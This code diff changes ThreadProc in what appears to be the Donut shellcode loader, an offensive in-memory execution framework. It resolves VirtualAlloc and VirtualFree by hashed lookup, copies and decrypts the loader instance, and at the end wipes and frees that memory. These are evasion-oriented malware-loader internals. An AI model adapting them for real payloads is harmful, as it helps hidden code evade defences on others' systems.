@@ -37,21 +37,44 @@ DWORD ThreadProc(LPVOID lpParameter) {
     PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY  assembly;
     PDONUT_MODULE   mod;
+    VirtualAlloc_t  _VirtualAlloc;
+    VirtualFree_t   _VirtualFree;
+    LPVOID          pv;
     
+    DPRINT("Resolving address for VirtualAlloc() : %p and VirtualFree() : %p", 
+     (LPVOID)inst->api.VirtualAlloc, (LPVOID)inst->api.VirtualFree);
+     
+    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, (ULONG64)inst->api.VirtualAlloc, inst->iv);
+    _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, (ULONG64)inst->api.VirtualFree,  inst->iv);
+    
+    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
+      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
+    
+    DPRINT("Allocating %i bytes of RW memory", inst->len);
+    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if(pv == NULL) {
+      DPRINT("Memory allocation failed...");
+      return -1;
+    }
+    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
+    Memcpy(pv, lpParameter, inst->len);
+    inst = (PDONUT_INSTANCE)pv;
+    
+    DPRINT("Zero initializing PDONUT_ASSEMBLY");
     Memset(&assembly, 0, sizeof(assembly));
     
 #if !defined(NOCRYPTO)
     PBYTE           inst_data;
     // load pointer to data just past len + key
-    ofs = sizeof(DWORD) + sizeof(DONUT_CRYPT);
-    inst_data = (PBYTE)inst + ofs;
+    inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
     
     DPRINT("Decrypting %li bytes of instance", inst->len);
     
     donut_decrypt(inst->key.mk, 
             inst->key.ctr, 
             inst_data, 
-            inst->len - ofs);
+            inst->len - offsetof(DONUT_INSTANCE, api_cnt));
     
     DPRINT("Generating hash to verify decryption");
     ULONG64 mac = maru(inst->sig, inst->iv);
@@ -78,6 +101,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
       DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
         
       inst->api.addr[i] = xGetProcAddress(inst, inst->api.hash[i], inst->iv);
+      
       if(inst->api.addr[i] == NULL) {
         DPRINT("Failed to resolve API");
         return -1;
@@ -133,8 +157,12 @@ DWORD ThreadProc(LPVOID lpParameter) {
         inst->module.p = NULL;
       }
     }
-    // clear instance from memory
+    
+    DPRINT("Erasing RW memory for instance");
     Memset(inst, 0, inst->len);
+    
+    DPRINT("Releasing RW memory for instance");
+    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     
     return 0;
 }
